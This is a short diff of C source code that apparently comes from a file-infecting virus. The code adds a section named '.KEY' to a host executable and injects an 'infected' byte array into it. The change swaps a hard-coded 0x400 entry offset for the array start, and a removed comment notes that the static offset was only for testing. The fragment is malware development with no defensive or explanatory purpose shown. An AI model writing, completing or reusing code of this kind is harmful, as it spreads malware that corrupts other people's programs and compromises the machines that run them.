@@ -73,7 +73,7 @@ int main() {
 	char sec[] = ".KEY";
 	if (addSection(file_host, sec, size)) {
 		printf("section add\n");
-		if (addCode(file_host, &byte_infected[0x400],size)) {//0x400 entry point of test this static because of this is a test must dynamic to complete
+		if (addCode(file_host, byte_infected,size)) {
 			printf("CODE ADD\n");
 		}
 	}
